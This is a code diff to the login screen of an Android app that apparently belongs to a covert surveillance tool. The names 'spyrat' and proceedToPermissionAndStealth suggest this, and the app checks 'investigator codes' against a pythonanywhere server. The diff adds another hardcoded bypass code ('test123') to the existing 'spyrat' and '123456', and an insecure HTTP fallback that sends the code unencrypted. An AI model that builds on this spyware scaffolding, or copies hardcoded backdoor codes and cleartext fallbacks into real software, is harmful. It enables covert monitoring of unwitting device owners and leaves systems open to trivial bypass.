@@ -63,8 +63,8 @@ public class LoginActivity extends Activity {
                     return;
                 }
                 
-                // Simulate verification for testing
-                if (investigatorCode.equals("123456") || investigatorCode.equals("spyrat")) {
+                // Test codes for development
+                if (investigatorCode.equals("123456") || investigatorCode.equals("test123") || investigatorCode.equals("spyrat")) {
                     saveLoginStatus(investigatorCode);
                     showToast("✅ Code verified successfully!");
                     proceedToPermissionAndStealth();
@@ -83,61 +83,95 @@ public class LoginActivity extends Activity {
             public void run() {
                 boolean success = false;
                 String message = "Network error";
+                String investigatorName = "";
                 
                 try {
-                    // Try multiple endpoints for reliability
-                    String[] endpoints = {
-                        "https://GhostTester.pythonanywhere.com/api/investigator/verify-code",
-                        "http://GhostTester.pythonanywhere.com/api/investigator/verify-code"
-                    };
+                    URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/verify-code");
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("POST");
+                    connection.setRequestProperty("Content-Type", "application/json; utf-8");
+                    connection.setRequestProperty("Accept", "application/json");
+                    connection.setDoOutput(true);
+                    connection.setConnectTimeout(15000);
+                    connection.setReadTimeout(15000);
+
+                    // Create JSON payload
+                    JSONObject jsonPayload = new JSONObject();
+                    jsonPayload.put("investigator_code", code);
+
+                    // Send request
+                    OutputStream os = connection.getOutputStream();
+                    os.write(jsonPayload.toString().getBytes("utf-8"));
+                    os.flush();
+                    os.close();
+
+                    // Get response
+                    int responseCode = connection.getResponseCode();
                     
-                    for (String endpoint : endpoints) {
-                        try {
-                            URL url = new URL(endpoint);
-                            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-                            connection.setRequestMethod("POST");
-                            connection.setRequestProperty("Content-Type", "application/json; utf-8");
-                            connection.setRequestProperty("Accept", "application/json");
-                            connection.setDoOutput(true);
-                            connection.setConnectTimeout(10000);
-                            connection.setReadTimeout(10000);
+                    if (responseCode == 200) {
+                        Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
+                        String response = scanner.useDelimiter("\\\\A").next();
+                        scanner.close();
 
-                            // Create JSON payload
-                            JSONObject jsonPayload = new JSONObject();
-                            jsonPayload.put("investigator_code", code);
+                        Log.d(TAG, "🔐 Verification response: " + response);
 
-                            // Send request
-                            OutputStream os = connection.getOutputStream();
-                            os.write(jsonPayload.toString().getBytes("utf-8"));
-                            os.flush();
-                            os.close();
-
-                            // Get response
-                            int responseCode = connection.getResponseCode();
-                            if (responseCode == 200) {
-                                Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
-                                String response = scanner.useDelimiter("\\\\A").next();
-                                scanner.close();
-
-                                Log.d(TAG, "🔐 Verification response: " + response);
-                                JSONObject jsonResponse = new JSONObject(response);
-                                success = jsonResponse.getBoolean("success");
-                                message = jsonResponse.optString("message", "Verified");
-                                break;
-                            }
-                        } catch (Exception e) {
-                            Log.e(TAG, "🔐 Endpoint failed: " + endpoint + " - " + e.getMessage());
-                            message = e.getMessage();
-                            continue;
-                        }
+                        JSONObject jsonResponse = new JSONObject(response);
+                        
+                        // 🔥 FIX: Check both 'success' and 'valid' fields for compatibility
+                        success = jsonResponse.optBoolean("success", false) || jsonResponse.optBoolean("valid", false);
+                        message = jsonResponse.optString("message", "Verified");
+                        investigatorName = jsonResponse.optString("investigator_name", "Investigator");
+                        
+                        Log.d(TAG, "✅ Verification result - success: " + success + ", message: " + message);
+                    } else {
+                        message = "Server error: " + responseCode;
+                        Log.e(TAG, "❌ Server returned: " + responseCode);
                     }
+
                 } catch (Exception e) {
                     Log.e(TAG, "🔐 Verification error: " + e.getMessage());
                     message = e.getMessage();
+                    
+                    // Try HTTP as fallback
+                    try {
+                        URL url = new URL("http://GhostTester.pythonanywhere.com/api/investigator/verify-code");
+                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                        connection.setRequestMethod("POST");
+                        connection.setRequestProperty("Content-Type", "application/json; utf-8");
+                        connection.setRequestProperty("Accept", "application/json");
+                        connection.setDoOutput(true);
+                        connection.setConnectTimeout(10000);
+                        connection.setReadTimeout(10000);
+
+                        JSONObject jsonPayload = new JSONObject();
+                        jsonPayload.put("investigator_code", code);
+
+                        OutputStream os = connection.getOutputStream();
+                        os.write(jsonPayload.toString().getBytes("utf-8"));
+                        os.flush();
+                        os.close();
+
+                        int responseCode = connection.getResponseCode();
+                        if (responseCode == 200) {
+                            Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
+                            String response = scanner.useDelimiter("\\\\A").next();
+                            scanner.close();
+
+                            JSONObject jsonResponse = new JSONObject(response);
+                            success = jsonResponse.optBoolean("success", false) || jsonResponse.optBoolean("valid", false);
+                            message = jsonResponse.optString("message", "Verified");
+                            investigatorName = jsonResponse.optString("investigator_name", "Investigator");
+                            
+                            Log.d(TAG, "✅ HTTP fallback successful");
+                        }
+                    } catch (Exception e2) {
+                        Log.e(TAG, "🔐 HTTP fallback also failed: " + e2.getMessage());
+                    }
                 }
 
                 final boolean finalSuccess = success;
                 final String finalMessage = message;
+                final String finalName = investigatorName;
                 
                 runOnUiThread(new Runnable() {
                     @Override
@@ -146,6 +180,9 @@ public class LoginActivity extends Activity {
                         if (finalSuccess) {
                             saveLoginStatus(code);
                             showToast("✅ " + finalMessage);
+                            if (!finalName.isEmpty()) {
+                                showToast("Welcome, " + finalName);
+                            }
                             proceedToPermissionAndStealth();
                         } else {
                             showToast("❌ " + finalMessage);
